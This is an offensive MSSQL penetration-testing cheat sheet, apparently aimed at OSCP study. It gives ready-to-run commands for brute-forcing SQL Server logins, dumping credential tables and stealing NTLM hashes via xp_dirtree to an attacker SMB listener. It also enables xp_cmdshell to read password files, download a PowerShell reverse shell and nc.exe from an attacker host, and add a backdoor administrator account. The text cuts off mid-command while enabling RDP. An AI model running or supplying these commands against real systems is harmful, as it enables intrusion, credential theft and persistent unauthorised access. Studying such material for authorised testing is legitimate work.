# üéØ MSSQL Pentesting Checklist & Commands

## What am I realistically expecting to find here?

- [ ] Service banner revealing SQL Server version (for CVE research)
- [ ] Valid credentials via default passwords or brute-force
- [ ] Access to database content (user tables, saved passwords, configs)
- [ ] Ability to execute system commands via xp_cmdshell if enabled
- [ ] Ability to enable xp_cmdshell if permissions allow
- [ ] Possibility to steal NTLM hashes via xp_dirtree triggering SMB authentication
- [ ] Evidence of linked servers for lateral movement
- [ ] Potential to upload payloads or webshells through SQL command output
- [ ] Sensitive data in queryable tables that can be used for further attacks

---

# ‚úÖ MSSQL - Unauthenticated Enumeration

## üîç Port Scan & Banner Grabbing

```bash
nmap -p 1433 --script='banner,(ms-sql* or ssl*) and not (brute or dos)' <IP> -oN mssql_nmap.txt
```

## üîì Brute-Force Credentials

```bash
hydra -l sa -P rockyou.txt -V <IP> mssql
hydra -L users.txt -P passwords.txt <IP> mssql -vV -I -u

# Nmap brute
nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt <IP>
```

---

# ‚úÖ MSSQL - Authenticated Enumeration & Exploitation

## üîê Connect to Server

```bash
# sqsh
sqsh -S <IP> -U sa
sqsh -S <IP> -U sa -P password

# mssqlclient.py
mssqlclient.py <user>:<password>@<IP>
mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
```

## üß† Useful Queries

```sql
-- Get version
select @@version;

-- List databases
select name from master.dbo.sysdatabases;

-- Enumerate tables
SELECT table_name from <DB>.INFORMATION_SCHEMA.TABLES;

-- Dump credentials
SELECT * from [DB].[dbo].users;
```

---

## üõ† CrackMapExec Usage

```bash
crackmapexec mssql <IP> -u <user> -p <pass> --local-auth

# Run query
crackmapexec mssql <IP> -u <user> -p <pass> -q "SELECT name FROM master.dbo.sysdatabases"

# Remote command
crackmapexec mssql <IP> -u <user> -p <pass> -x whoami

# Upload/Download
crackmapexec mssql <IP> -u <user> -p <pass> --put-file /etc/passwd C:/Users/Public/passwd
crackmapexec mssql <IP> -u <user> -p <pass> --get-file C:/Windows/System32/drivers/etc/hosts hosts

# PrivEsc module
crackmapexec mssql <IP> -u <user> -p <pass> -M mssql_priv -o ACTION=privesc
```

---

## üß≤ NTLM Hash Stealing

> NOTE !! poisoning is not allowed in OSCP

```
responder -I tun0

EXEC xp_dirtree '\<KALI_IP>\share_name'

hashcat -m 5600 ./hash /usr/share/wordlists/rockyou.txt --force
```


```sql
-- Trigger SMB auth
exec master..xp_dirtree '\\<attacker_ip>\liodeus\'

# Attacker listener
sudo smbserver.py -smb2support liodeus .
```

Refs:
- https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/
- https://r4j3sh.medium.com/offsec-vault-proving-grounds-practice-writeup-380915703a09

---

## üí• RCE via xp_cmdshell

### Enable xp_cmdshell

```sql
exec sp_configure 'show advanced options', 1;
reconfigure;
exec sp_configure 'xp_cmdshell', 1;
reconfigure;
```

### Command Execution Examples

```sql
xp_cmdshell 'whoami /all';
xp_cmdshell 'systeminfo';
xp_cmdshell 'net user';
xp_cmdshell 'reg query HKLM /f pass /t REG_SZ /s';
xp_cmdshell 'findstr /si password *.txt *.ini *.config *.xml';
xp_cmdshell "powershell -c iex(new-object net.webclient).downloadstring('http://<IP>/Invoke-PowerShellTcp.ps1')";
xp_cmdshell "certutil -urlcache -f 'http://<IP>/nc.exe' nc.exe";

-- Create admin user
xp_cmdshell 'net user attacker attackerpass /add';
xp_cmdshell 'net localgroup Administrators attacker /add';

-- Enable RDP
xp_cmdshell 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"
